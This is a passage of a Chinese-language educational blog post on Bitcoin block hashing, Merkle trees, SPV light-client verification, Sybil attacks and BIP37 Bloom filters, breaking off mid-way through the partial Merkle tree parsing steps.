<p>由于区块头里面包含“父区块哈希值”字段，所以当前区块的哈希值也受到该字段的影响。如果父区块的身份标识发生变化，子区块的身份标识也会跟着变化。当父区块有任何改动时，父区块的哈希值也发生变化。这将迫使子区块的“父区块哈希值”字段发生改变，从而又将导致子区块的哈希值发生改变。而子区块的哈希值发生改变又将迫使孙区块的“父区块哈希值”字段发生改变，又因此改变了孙区块哈希值，以此类推。一旦一个区块有很多代以后，这种瀑布效应将保证该区块不会被改变，除非强制重新计算该区块所有后续的区块。正是这样的重新计算需要耗费巨大的计算量，所以一个长区块链的存在可以让区块链的历史不可改变，这也是比特币安全性的一个关键特征。</p>
<p>区块主标识符是它的加密哈希值，一个通过SHA256算法对区块头进行二次哈希计算而得到的数字指纹。产生的32字节哈希值被称为区块哈希值，但是更准确的名称是：区块头哈希值，因为只有区块头被用于计算。例 如: 000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f是第一个比特币区块的区块哈希值。区块哈希值可以唯一、明确地标识一个区块，并且任何节点通过简单地对区块头进行哈希计算都可以独立地获取该区块哈希值。</p>
<hr>
<p>每个区块都包含一个或多个交易。每个区块的第一个交易是coinbase transaction，也即generation transaction，作为矿工打包交易生成区块的奖励，当前的挖矿奖励是12.5个比特币。coinbase交易的UTXO有一个特殊的规定，至少在100个区块之后才能作为输入进行花费。主要是防止矿工在区块还没有被正式确认的情况下就把币给花了。虽然区块并不要求除了coinbase之外的交易，但是矿工们一般都会尽量多打包一些交易，以获得尽可能多的交易费用。</p>
<p>区块中的所有交易都使用二进制<a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/serialized-transaction">raw transaction</a>的格式保存在区块中，然后对raw transaction进行哈希得到交易id（txid）。merkle树就是使用这样的txid进行构造的。</p>
<h3 id="Merkle树概念"><a href="#Merkle树概念" class="headerlink" title="Merkle树概念"></a>Merkle树概念</h3><p>Merkle tree是一种哈希二叉树，以Ralph Merkle命名，Ralph在1979年对该数据结构申请了专利（于2002年过期）。它是一种用做快速归纳和校验大规模数据完整性的树形数据结构。</p>
<p>特点:</p>
<ul>
<li>它是一种树，大多数是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh/%E4%BA%8C%E5%8F%89%E6%A0%91">二叉树</a>，也可以是多叉树，具有树结构的所有特点。</li>
<li>Merkle Tree的叶子节点是数据块的哈希。</li>
<li>Merkle Tree的非叶子节点的哈希值是根据它下面所有叶子节点的值哈希计算得到，如下图所示。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233036.jpg" alt="img"></p>
<p>在上图中， T<sub>A</sub><del>T<sub>H</sub>是区块中包括的正常的交易。从底层向上构建Merkle树，对每个交易都进行哈希，分别得到 H<sub>A</sub></del>H<sub>H</sub>!生成的单个哈希与邻近的哈希值组合，再次进行哈希。譬如  H<sub>A</sub>和 H<sub>B</sub>组合，再次进行哈希，得到 H<sub>AB</sub>. 这个过程一直持续下去，从底层一直到树根。</p>
<p>如果节点总数是奇数个，则复制一份最后一个节点。譬如对于5个叶子节点的情况，最终生成的树可能是这样的：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233037.jpg" alt="img"></p>
<p>如果叶子恰好是2的次方，则在树根处的情况如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233038.jpg" alt="img"></p>
<p>在上图中，<strong>merkle root，</strong>标记为 H<sub>ABCDEFGHIJKLMNOP</sub>,是一个32字节的数据，并且会被放置在区块头中，代表了整个区块的交易数据。</p>
<p>由于哈希的单向性，可以得出结论，如果两棵Merkle树的merkle root相同，那么这两棵树的结构和每个节点也必然是相同的。另外，只要存储的叶子节点数据有任何的变动，就会逐级向上传递到相应的父节点，最终使得Merkle树的根节点哈希值发生变化。</p>
<p>除了区块链之外，Merkle可信树在其他领域应用也很多，如在分布式系统中用于数据一致性验证，git中的版本一致性验证也是基于Merkle树。大部分Merkle树是二叉哈希树，在比特币中，merkle树主要适用于组织正常的交易，使得交易易于验证并且使用较少的资源。</p>
<p>为什么要使用这样的数据结构呢？树这种数据结构我们应该是比较熟悉的，特别是这种满二叉树。那我们来算一下，如果如上图所示，有16个叶子节点，也即一个区块中有16个交易，那么总共需要多少次哈希计算？如果是为了保证区块中的交易没有被篡改，那么实际上只需要把16个交易连接起来，然后对整个内容做一次哈希就够了，为什么要这么麻烦形成一棵树，而且做这么多次的计算呢？</p>
<p>我们来使用分布式文件服务器做例子。如果两个服务器A和B都是对某个文件系统的冗余备份。现在希望A和B通信来确认一下，它们所保存的文件是一致的。如果不使用哈希，那么这个通信代价是整个的文件系统，需要把所有的文件都传递到一个进行比较的服务器上，然后进行字符串比较。这无疑是非常低效的。比较哈希当然是一个好方法。因为哈希的单向性和固定的输出长度，所以通信代价就大大降低了。那么为什么要用一棵树呢？</p>
<p>如果A和B两个服务器上存储的文件系统都是一致的，也即两个的哈希值是一样的，那么自然是很好的。如果两个不一致呢？譬如说A服务器上有一个文件更新了，而B服务器还没有来得及更新。怎么样能够快速地定位到导致两个文件系统不一致的文件？</p>
<p>这时就能体现树结构的好处了。如果两个哈希值不一致，A服务器就可以向B服务器要两个子节点的哈希值；然后沿着不一样的路径一直走下去，从而可以确定导致根哈希值不同的文件。而且确定这个不一致文件的复杂度是？</p>
<p>以上是分布式文件服务器的例子。那么在比特币中，Merkle树的作用是什么呢？</p>
<p>默认情况下，一旦接受到一个新交易，节点需要验证它，特别是，验证交易的输入中的每一个之前是否被花费。为了完成这个验证，需要访问区块链。如果节点不信任网络上的其他节点，那么 这个节点需要保存网络上的所有区块，以便验证交易。这种节点称作全节点。在比特币发展的早期，所有节点都是全节点；当前的比特币核心客户端也是完整区块链节点。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233039.jpg" alt="img"></p>
<p>在当前的比特币网络中，实际参与共识的全验证节点（fully validating nodes）并不多，因为全验证节点会维护整个区块链的数据，由于区块链的不可篡改和append-only，随着时间的增加，整个区块链的数据量非常大。在2014年4月份，比特币网络中存储所有区块的数据，需要15GB的空间，现在要完整下载比特币的所有区块数据，需要200GB以上的空间。</p>
<p>全节点要检查第300,000号区块中的某个交易，它会把从该区块开始一直回溯到创世区块的300,000个区块全部都链接起来，建立一个完整的UTXO数据库，通过确认该UTXO是否还未被支付来证实交易的有效性。全验证节点维护所有的UTXO， 最好是存在RAM中，这样，当网络中有新的交易广播时，全验证节点可以快速地进行查询、运行脚本、确定交易是否正确、签名是否有效，如果全部正确，则将交易添加到交易池中。</p>
<h3 id="SPV-simple-payment-verification"><a href="#SPV-simple-payment-verification" class="headerlink" title="SPV(simple payment verification)"></a>SPV(simple payment verification)</h3><p>全验证节点对硬件提出了很高要求，个人用户（移动设备）参与这个过程几乎是不可能的。为了客户友好，对于仅仅使用钱包的普通用户，也即轻量级的节点，比特币网络中的大部分用户都是轻量级的用户，比特币网络并不要求它们也存储所有的信息。这种节点只需要维护能够验证用户自己所care的交易的部分信息就行了。这也是中本聪在比特币白皮书中所提出的SPV（simple payment verification）的概念。SPV可以不需整个网络的数据而确认交易是否存在。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233040.jpg" alt="img"></p>
<p>轻量级节点往往只需要存储区块链头部就可以了。使用有限的信息，轻节点就能够证明某一笔交易是否存在与区块链中。区块头是80字节，一个区块至少是1M，完整交易的区块比区块头的要大的多。因为区块头部信息很少，每年的增加总量大概是在5M左右，所以简单的硬件设备也完全可以运行。</p>
<p>那问题是，SPV是怎么实现的呢？为什么仅仅需要有限的信息就可以进行验证？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233041.jpg" alt="img">中本聪比特币白皮书中的例子</p>
<p>譬如用户Bob收到用户Alice发来的一笔支付交易，这时Bob必须要验证这笔交易（1）确实存在，并且（2）不是双重支付。对于SPV用户而言，需要从可信节点获得区块链的完整的头部信息，以及和他想验证的交易的Merkle分支。这样，虽然用户不能自己验证交易，但如果能够从区块链的某处找到符合的交易，就可以知道这笔交易已被网络确认，也可以确认该笔交易得到网络多少笔确认。譬如，SPV节点要验证第300,000号区块中的某个交易，它需要获得300,000区块中交易的Merkle分支（Merkle路径）进行验证，并且等到序号从300,001到300,006的六个区块堆叠在该交易所在的区块上。如果网络中的其他节点都接受了第300,000区块，并通过足够的工作在该块之上又生成了六个区块，就可以证明该交易不是双重支付。</p>
<p>使用Merkle分支进行验证是Merkle树的Tamper proof性质， 使用Merkle树之后，可以很容易验证区块中的交易有没有被篡改。譬如在上图中的例子，如果一个交易 T<sub>H</sub>被篡改成了 T<sub>?</sub> ，那么交易的哈希值会不同，沿着从底层到根节点的路径向上，会导致最终树的merkle root不同，也即保存在区块链头的值不同。相反，如果从叶子节点到Merkle根的路径上，所有的哈希值都验证正确，那么可以证明这个交易确实存在于这个区块中。</p>
<p>如上图，如果需要证明某个区块上是否存在一笔交易Tx3，那么全节点返回的Merkle路径是Hash2和Hash01。只需要这两个值就可以进行验证过程如下：</p>
<ul>
<li>Step1：计算交易Tx3的哈希值，得到Hash3</li>
<li>Step2：通过Hash2和Hash3的哈希值，得到父节点的哈希值Hash23</li>
<li>Step3：同上，通过计算Hash23和Hash01哈希值，得到根节点的哈希值。</li>
<li>Step4：将上一步得到的根哈希值对比区块头中MerkleTree的根哈希值，如果相同，则证明该区块中存在交易Tx3，否则说明不存在。</li>
</ul>
<p>使用Merkle树可以大大降低SPV节点的存储和计算负担；下面的表格对比了区块中不同交易数量的情况下，完整区块大小和Merkle路径大小的情况。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233042.jpg" alt="img"></p>
<p>SPV节点的安全性</p>
<p>（1）若全节点返回的是一条恶意的路径？试图为一个不存在于区块链中的节点伪造一条合法的merkle路径，使得最终的计算结果与区块头中的默克尔根哈希相同。</p>
<p>由于哈希的计算具有不可预测性，使得一个恶意的“全”节点想要为一条不存在的节点伪造一条“伪路径”使得最终计算的根哈希与轻节点所维护的根哈希相同是不可能的。</p>
<p>（2）为什么不直接向全节点请求该节点是否存在于区块链中？</p>
<p>由于在公链的环境中，无法判断请求的全节点是否为恶意节点，因此直接向某一个或者多个全节点请求得到的结果是无法得到保证的。但是轻节点本地维护的区块头信息，是经过工作量证明验证的，也就是经过共识一定正确的，若利用全节点提供的Merkle路径，与待验证的节点进行哈希计算，若最终结果与本地维护的区块头中根哈希一致，则能够证明该节点一定存在于默克尔树中。</p>
<p>（3）SPV容易受到什么攻击？</p>
<p>SPV节点毫无疑问可以证实某个交易的存在性，它也能够证明某个区块中不存在某个交易，但它不能验证某个交易（譬如同一个UTXO的双重支付）在整个链中不存在，这是因为SPV节点没有一份关于所有交易的记录。这个漏洞会被针对SPV节点的拒绝服务攻击或双重支付型攻击所利用。为了防御这些攻击，SPV节点需要随机连接到多个节点，以增加与至少一个可靠节点相连接的概率。这种随机连接的需求意味着SPV节点也容易受到网络分区攻击或Sybil攻击。在后者情况中，SPV节点被连接到虚假节点或虚假网络中，没有通向可靠节点或真正的比特币网络的连接。</p>
<p>在绝大多数的实际情况中，具有良好连接的SPV节点是足够安全的，它在资源需求、实用性和安全性之间维持恰当的平衡。当然，如果要保证万无一失的安全性，最可靠的方法还是运行完整区块链的节点。</p>
<blockquote>
<p>完整的区块链节点是通过检查整个链中在它之下的数千个区块来保证这个UTXO没有被支付，从而验证交易。而SPV节点是通过检查在包含该交易的区块所收到的确认数目来验证交易。</p>
</blockquote>
<h2 id="Sybil攻击"><a href="#Sybil攻击" class="headerlink" title="Sybil攻击"></a>Sybil攻击</h2><p>Sybil攻击是指利用社交网络中的少数节点控制多个虚假身份，从而利用这些身份控制或影响网络的大量正常节点的攻击方式 。</p>
<p>直接通信：进行sybil攻击的一种形式是sybil结点直接与合法结点进行通信。当合法结点发送一个无线消息给sybil结点时，sybil结点中的一个会监听这个消息。同样地，从所有sybil结点发送出的消息事实上也是从同一个恶意设备发出的。</p>
<p>间接通信：在这个版本的攻击中，没有一个合法的结点能够直接与sybil结点进行通信。相反，一个或多个恶意的结点宣称他们能够到达sybil结点。因此，发送给sybil结点的消息都是通过其中的一个恶意结点进行路由转发的，这个恶意结点假装把这个消息发送给sybil结点，而事实上就是这个恶意结点自己接收或者拦截了这个消息。</p>
<p>伪造身份：在某些情况下，一个攻击者可以产生任意的sybil身份。比如说如果一个结点的身份是一个32-位的整数，那么攻击者完全可以直接为每一个sybil结点分配一个32-位的值作为它的身份。</p>
<p>盗用身份：如果给定一种机制来识别结点的身份，那么攻击者就不能伪造身份了。举个例子来说，命名空间，由于命名空间本身就是有限的，根本不允许插入一个新的身份。在这种情况下，攻击者需要分配一个合法的身份给sybil结点。这种身份盗用在攻击者把原有结点摧毁或者使之失效的情况下是不好检测的。</p>
<p>同时攻击：攻击者将其所有的sybil身份一次性的同时参与到一次<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1">网络通信</a>中。如果规定一个结点只能使用它的身份一次，那么这个恶意结点就可以循环的使用它的多个sybil身份让人看起来是多个结点。这就是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%90%8C%E6%97%B6%E6%80%A7/3245687">同时性</a>。</p>
<p>非同时攻击：如果攻击者只在一个特定的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E5%91%A8%E6%9C%9F/7539382">时间周期</a>里使用一部分sybil身份，而在另外一个时间段里是这些身份消失而以另外的sybil身份出现，这看起来就像网络中正常的结点撤销和加入。</p>
<h2 id="Bloom-Filter"><a href="#Bloom-Filter" class="headerlink" title="Bloom Filter"></a>Bloom Filter</h2><p>在之前的例子中，我们并没有涉及一些细节。譬如，SPV节点直接就向全节点请求某一交易的Merkle路径。SPV节点怎么样从网络中接收到与自己相关的交易，确定交易所在的区块呢？</p>
<p>SPV节点一般只需要的是和自己的地址相关的交易。在BIP37之前，SPV的做法是将所有的区块和交易都下载下来，然后本地将不相关的交易给删掉。当然带来的问题就是同步慢、浪费带宽、增加内存使用。在BIP-37中就提到了因为这一点，导致用户对手机APP“Bitcoin Wallet”有所抱怨。</p>
<p>为了解决这个问题，最直接的做法就是SPV节点仅向全节点请求和自己地址相关的交易，也即请全节点过滤和自己地址不相关的信息，如果全节点发现某个交易符合SPV节点的需求时，就将以Merkleblock消息的形式发送该交易，Merkleblock消息包含区块头和Merkle路径。此时，SPV就需要在请求中附上自己的地址信息。</p>
<p>因此与全区块链节点收集每一个区块内的全部交易所不同，SPV节点对特定数据的请求可能无意中透露了钱包里的地址信息。如果监控网络的第三方跟踪某个SPV节点上的钱包所请求的全部交易信息，就能利用这些交易信息把比特币地址和钱包的用户关联起来。</p>
<p>举例来说，如果在问路时，使用具体的地址，如“南京路188号”，那么可能得到具体的位置；但同时也泄露了目的地。如果问不同的人，188号在哪里？可能得到所有188号的信息；然后问南京路在哪里？可以得到一整条路的信息。那么虽然获得的答案中包括一些无关的信息；但是，相对应的，隐私得到了一定程度的保护。</p>
<p>因此，在引入SPV节点&#x2F;轻量级节点后不久，比特币开发人员就添加了一个新功能：Bloom过滤器。这是在2012年的BIP37中引入的。<a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0037.mediawiki">bitcoin&#x2F;bips</a> 在比特币中，使用Bloom过滤器来加快钱包同步；以太坊使用Bloom过滤器用于快速查询以太坊区块链的日志。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233043.jpg" alt="img"></p>
<p>布隆过滤器（Bloom Filter）是1970年由布隆提出的，用来判断某个元素是否在集合内，它具有运行速度快（时间效率），占用内存小的优点（空间效率），但是有一定的误识别率和删除困难的问题。它能够判断某个元素一定不在集合内或可能在集合内，也即Bloom Filter会造成一定的False Positive，但是不会造成False Negative。</p>
<p>Bloom过滤器的实现是由一个可变长度（N）的二进制数组（N位二进制数构成一个位域）和数量可变（M）的一组哈希函数组成。这些哈希函数的输出值始终在1和N之间，并且该函数为确定性函数，也即对特定输入总是得到同一个的结果。Bloom过滤器的准确性和私密性能通过改变长度（N）和哈希函数的数量（M）来调节。</p>
<p>与其它数据结构相比较，Bloom filter的优点包括：空间效率和查找时间复杂性；不需要存储元素本身，在保护隐私方面具有优势。</p>
<p>下面通过一些例子来具体解释Bloom Filter的工作原理。</p>
<p>这里使用十六位数组（N&#x3D;16）和三个哈希函数（M&#x3D;3）来演示Bloom过滤器的应用原理。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233044.jpg" alt="img"></p>
<p align="center">由16位数组和3个哈希函数组成的简易Bloom Filter</p>

<p>Bloom过滤器数组里的每一个数的初始值为零。关键词被加到Bloom过滤器中之前，会依次通过每一个哈希函数运算一次。该输入经第一个哈希函数运算后得到了一个在1和N之间的数，它在该数组（编号依次为1至N）中所对应的位被置为1，从而把哈希函数的输出记录下来。接着再进行下一个哈希函数的运算，把另外一位置为1；以此类推。当全部M个哈希函数都运算过之后，一共有M个位的值从0变成了1，这个关键词也被“记录”在了Bloom过滤器里。</p>
<p>向上图中的简易Bloom过滤器添加关键词“A”。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233045.jpg" alt="img"></p>
<p align="center">向简易Bloom过滤器中增加关键词“A”</p>

<p>增加第二个关键词就是简单地重复之前的步骤。关键词依次通过各个哈希函数运算之后，相应的位变为1，Bloom过滤器则记录下该关键词。需要注意的是，当Bloom过滤器里的关键词增加时，它对应的某个哈希函数的输出值的位可能已经是1了，这种情况下，该位不会再次改变。也就是说，随着更多的关键词指向了重复的位，Bloom过滤器随着位1的增加而饱和，准确性也因此降低了。该过滤器之所以是基于概率的数据结构，就是因为关键词的增加会导致准确性的降低。准确性取决于关键字的数量以及数组大小（N）和哈希函数的多少（M）。更大的数组和更多的哈希函数会记录更多的 关键词以提高准确性。而小的数组及有限的哈希函数只能记录有限的关键词从而降低准确性。</p>
<p>【更大的数组可以提高准确性很好理解，因为可以降低冲突；如何理解需要更多哈希函数呢？这里主要是考虑到数组的大小一般而言是比较有限的，因此在单个哈希函数的时候，冲突是不可避免的；但是多个哈希函数同时发生碰撞的可能性就比较小。譬如有一个关键字”abc”被加入进来，只有只有一个哈希函数，有可能“xyz”会和”abc”发生碰撞，此时不能判断”xyz”是不是关键字。但是如果有三个哈希函数，“xyz”和”abc”在三个哈希函数中都碰撞的概率就比较小。】</p>
<p>问题：如果N比较小，当添加关键词时，所有的位都成为1，意味着什么？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233046.jpg" alt="img">向Bloom Filter增加关键词</p>
<p>为测试某一关键词是否被记录在某个Bloom过滤器中，则将该关键词逐一代入各哈希函数中运算，并将所得的结果与原数组进行对比。如果所有的结果对应的位都变为了1，则表示这个关键词有可能已被该过滤器记录。之所以这一结论并不确定，是因为这些字节1也有可能是其他关键词运算的重叠结果。简单来说，Bloom过滤器正匹配代表着“可能是”。</p>
<p>下图是一个验证关键词“X”是否在前述Bloom过滤器中的例子。相应的比特位都被置为1，所以这个关键词很有可能是匹配的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233047.jpg" alt="img"></p>
<p>测试关键词“X“是否能通过Bloom Filter</p>
<p>另一方面，如果我们代入关键词计算后的结果某位为0，说明该关键词并没有被记录在过滤器里。负匹配的结果不是可能，而是一定。也就是说，负匹配代表着“一定不是”。</p>
<p>下图验证关键词“Y”是否存在于简易Bloom过滤器中的图例。图中某个结果字段为0，该字段一定没有被匹配。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233048.jpg" alt="img"></p>
<p>通过使用Bloom Filter，使得SPV节点只接收交易信息的子集，同时不会泄露哪些是它们感兴趣的地址。实际上，再对Bloom Filter进行设置时，如果带宽和硬件条件宽裕，SPV节点可以选择具有高FP（false positive）率的Bloom Filter，此时如果有第三方对SPV进行跟踪，看到的将是大量的数据中混杂着与节点相关的数据，从而隐私性得到了保护。相反，如果带宽和硬件条件不宽裕，则可以选择尽可能精确的设置从而过滤掉不相关的数据，但是第三方就有可能将交易和IP地址关联起来。</p>
<p><strong>工作过程</strong></p>
<p>首先，SPV节点会初始化一个不会匹配任何关键词的“空白”Bloom过滤器。接下来，SPV节点会创建一个包含钱包中所有地址信息的列表，并创建一个与每个地址相对应的交易输出相匹配的搜索模式。通常，这种搜索模式是一个向公钥付款的哈希脚本，该脚本是一个会出现在每一个向公钥哈希地址（P2PKH）付款的交易中的锁定脚本。如果SPV节点需要追踪P2SH地址余额，搜索模式就会变成P2SH脚本。然后，SPV节点会把每一个搜索模式添加至Bloom过滤器里，这样只要关键词出现在交易中就能够被过滤器识别出来。最后，对等节点会用收到的Bloom过滤器来匹配传送至SPV节点的交易。</p>
<p><strong>用来filter的数据可以是tx.hash,也可以是txout.scriptPubKey中的data，也可以是txin.scriptSig中的data</strong> </p>
<p>Filter匹配算法</p>
<p>Bloom filter可以用于测试任何的数据，查看数据是否与用户加入filter中的数据相关。</p>
<p>在BIP37中，确定交易是否匹配filter，使用以下算法，一旦发现了匹配，则算法停止。</p>
<ol>
<li>测试交易本身的哈希。</li>
<li>对于每个输出，测试输出脚本中的每一个数据项。每一个哈希（密钥）都单独测试。如果在测试交易的时候发现了匹配的输出，那么节点也可以升级filter，将该输出的COutPoint结构也添加到filter中。也即，将该交易的输出中与SPV用户自己相关的部分（可用于其他交易的输入）添加到filter中。</li>
<li>对于每一个输入，测试COutPoint结构。</li>
<li>对于每一个输入，测试输入脚本ScriptSig的每一个数据项。</li>
<li>否则，没有匹配。</li>
</ol>
<p>来分析一下：</p>
<ol>
<li>步骤1是因为用户有可能对某一个特定的交易感兴趣；</li>
<li>步骤2是因为用户可能在过滤器中加入了自己的公钥或地址；如果某一笔交易发钱给自己，那么用该COutpoint来更新过滤器；【检查自己的收入】</li>
<li>步骤3检查自己的花费；</li>
<li>步骤4检查自己的花费；</li>
</ol>
<p>问题：哪些数据应该加入到filter中呢？</p>
<p>在上面的算法中，在step 2中提到“匹配的输出，那么节点也可以更新filter，将该输出的COutPoint结构也添加到filter中”。为什么要对filter进行及时的更新呢？</p>
<p>为啥要加入coutpoint，这里我们可以理解coutpoint是包括了(txid，coutputid)的一个数据结构。</p>
<p>The test for outpoints is there to ensure you can find transactions spending outputs in your wallet, even though you don’t know anything about their form. As you can see, once set on a connection the filter is <strong>not static</strong> and can change throughout the connections lifetime. This is done to avoid the following race condition:</p>
<p>A client sets a filter matching a key in their wallet. They then start downloading the block chain. The part of the chain that the client is missing is requested using getblocks.</p>
<ol>
<li>The first block is read from disk by the serving peer. It contains TX 1 which sends money to the clients key. It matches the filter and is thus sent to the client.</li>
<li>The second block is read from disk by the serving peer. It contains TX 2 which spends TX 1. However TX 2 does not contain any of the clients keys and is thus not sent. The client does not know the money they received was already spent.</li>
</ol>
<p>对outpoints的测试是为了确保能找到花费钱包中的输出的交易，即使你对它们的形式一无所知。正如你所看到的，一旦在连接上设置了过滤器，过滤器就不是静态的，它可以在整个连接的生命周期内改变。这样做是为了避免出现下面的race condition。</p>
<p>客户端设置了与钱包中的密钥（公钥、地址）相匹配的过滤器。然后他们开始下载区块链。客户端缺少的那部分区块链是使用getblocks请求的。</p>
<ul>
<li>第一个区块是由服务节点从磁盘上读取的。它包含TX 1，TX1向客户的密钥（公钥、地址）发送资金。它与过滤器相匹配，因此被发送到客户端。</li>
<li>第二个块是由服务节点从磁盘上读取的。它包含TX 2，它花费了TX 1。然而TX 2不包含任何客户的密钥（公钥、地址），因此没有被发送。客户端不知道他们收到的钱已经被花掉了。</li>
</ul>
<p>BIP 37在实现时，提供了Bloom_update_none选项，也即不更新。主要是因为，随着加入项的增多，Bloom Filter的效率会变低。用户可能需要定时刷新filter。</p>
<p>另外提供了Bloom_update_all选项，也即上文提到的将输出中的scriptpbk中的outpoint都加入进来；</p>
<p>另外，还提供了Bloom_update_P2PUBKEY_ONLY选项，也即仅在输出脚本是 pay-to-pubkey或者是pay to multisig形式的时候才将outpoint添加到filter中。</p>
<p>思考：为什么有Bloom_update_P2PUBKEY_ONLY选项？</p>
<p>【在P2PKH类型的交易中，如果要花费，则在scriptsig中一定会有用户的公钥提供，所以用户可以通过在filter中添加自己的公钥来查询；从而防止filter性能快速下降】</p>
<p>问题：能不能通过删除项来更新bloom filter?</p>
<p>字符串加入了就被不能删除了，因为删除会影响到其他字符串。实在需要删除字符串的可以使用Counting bloomfilter(CBF)，这是一种基本Bloom Filter的变体，CBF将基本Bloom Filter每一个Bit改为一个计数器，这样就可以实现删除字符串的功能了。</p>
<p>　　Bloom Filter跟单哈希函数Bit-Map不同之处在于：Bloom Filter使用了k个哈希函数，每个字符串跟k个bit对应。从而降低了冲突的概率。</p>
<p>最后，分析一下Bloom Filter的效率和内容占用情况，为何说它速度快，占用内存小。</p>
<p>Bloom filter被广泛应用于各种领域，比如拼写检查、字符串匹配算法、网络包分析工具、Web Cache、文件系统、存储系统等。</p>
<p>这里举例分析一下Bloom filter在重复数据删除应用中的空间和时间效率。重复数据删除技术的基本原理是对文件进行定长或变长分块，然后利用hash函数计算数据块指纹，如果两个数据块指纹相同则认为是重复数据块（存在数据碰撞问题），只保存一个数据块副本即可，其他相同数据块使用该副本索引号表示，从而实现数据缩减存储空间并提高存储效率。</p>
<p>为了查询一个数据块是否重复或者已经存在，需要计算数据块指纹并进行查找，并记录所有唯一数据块的指纹。举一个例子：32TB的数据，平均数据块大小为8KB，每个数据块使用MD5和SHA1计算两个指纹并用64位整数表示唯一块号则共占用44字节((128+160+64)&#x2F;8），则总共最多需要176GB（32TB&#x2F;8KB * 44 Byte）的存储空间来保存数据块信息。</p>
<p>现在的去重系统数据容量通常多达数十到数百TB，如果把数据块信息全部保存在内存中，显然对内存的需求量非常巨大。通常的做法是把数据块信息保存在磁盘或SSD上，使用一定内存量作 Cache缓存数据块指纹，利用时间局部性和空间局部性来提高查找性能。这种方法的一个关键问题是，如果新的数据块是不重复的，查找时会出现Cache不命中，从而引起大量的磁盘读写操作。由于磁盘或SSD性能要远远小于内存的，对查找性能影响非常大。</p>
<p>Bloom filter可以有效解决这个问题，DataDomain中的Summary Vector就是采用Bloom filter来实现的。对于前面的例子，一个数据块用3个hash函数计算指纹最多占用3个位，则Bloom filter仅需要1.5GB &#x3D; 32TB&#x2F;8KB * 3 &#x2F;8 bytes的内存空间。引入Bloom filter机制后，对于一个新数据块，首先查找Bloom filter，如果未命中则说明这是一个新的唯一数据块，直接保存数据块和并Cache数据块信息即可；如果命中，则说明这有可能是一个重复数据块，需要通过进一步的hash或tree查找进行确认，此时需要Cache与Disk进行交互。受益于Bloom filter以及Cache，DataDomain系统可以减少99%的磁盘访问，从而利用少量的内存空间大幅提高了数据块查重性能。</p>
<p>最后：BIP37中介绍了Merkle路径的构造。</p>
<h2 id="Partial-Merkle-branch-format"><a href="#Partial-Merkle-branch-format" class="headerlink" title="Partial Merkle branch format"></a>Partial Merkle branch format</h2><p>A <em>Merkle tree</em> is a way of arranging a set of items as leaf nodes of tree in which the interior nodes are hashes of the concatenations of their child hashes. The root node is called the <em>Merkle root</em>. Every Bitcoin block contains a Merkle root of the tree formed from the blocks transactions. By providing some elements of the trees interior nodes (called a <em>Merkle branch</em>) a proof is formed that the given transaction was indeed in the block when it was being mined, but the size of the proof is much smaller than the size of the original block.</p>
<h2 id="Constructing-a-partial-merkle-tree-object"><a href="#Constructing-a-partial-merkle-tree-object" class="headerlink" title="Constructing a partial merkle tree object"></a>Constructing a partial merkle tree object</h2><ul>
<li><p>Traverse the merkle tree from the root down, and for each encountered node:</p>
</li>
<li><ul>
<li><p>Check whether this node corresponds to a leaf node (transaction) that is to be included OR any parent thereof: </p>
</li>
<li><ul>
<li>If so, append a ‘1’ bit to the flag bits 【要么是节点本身，要么是其祖先】</li>
<li>Otherwise, append a ‘0’ bit.</li>
</ul>
</li>
<li><p>Check whether this node is a internal node (non-leaf) AND is the parent of an included leaf node: 【如果是节点祖先，那么才继续处理其孩子；否则，孩子跳过；注意叶子节点也需要添加hash，实际上要处理的叶子节点只有目标节点和它的兄弟节点】</p>
</li>
<li><ul>
<li><p>If so:</p>
</li>
<li><ul>
<li>Descend into its left child node, and process the subtree beneath it entirely (depth-first).</li>
<li>If this node has a right child node too, descend into it as well.</li>
</ul>
</li>
<li><p>Otherwise: append this node’s hash to the hash list.</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>【这段的结果是，从根往下遍历，能够将需要返回的Merkle路径的所有节点的flag设置为0】</p>
<h2 id="Parsing-a-partial-merkle-tree-object"><a href="#Parsing-a-partial-merkle-tree-object" class="headerlink" title="Parsing a partial merkle tree object"></a>Parsing a partial merkle tree object</h2><p>As the partial block message contains the number of transactions in the entire block, the shape of the merkle tree is known before hand. Again, traverse this tree, computing traversed node’s hashes along the way:</p>
<ul>
<li><p>Read a bit from the flag bit list:</p>
</li>
<li><ul>
<li><p>If it is ‘0’:</p>
</li>
<li><ul>
<li>Read a hash from the hashes list, and return it as this node’s hash.</li>
</ul>
</li>
<li><p>If it is ‘1’ and this is a leaf node:</p>
</li>
<li><ul>
<li>Read a hash from the hashes list, store it as a matched txid, and return it as this node’s hash.</li>
</ul>
</li>
<li><p>If it is ‘1’ and this is an internal node:</p>
</li>
<li><ul>
<li><p>Descend into its left child tree, and store its computed hash as L.</p>
</li>
<li><p>If this node has a right child as well:</p>
</li>
<li><ul>
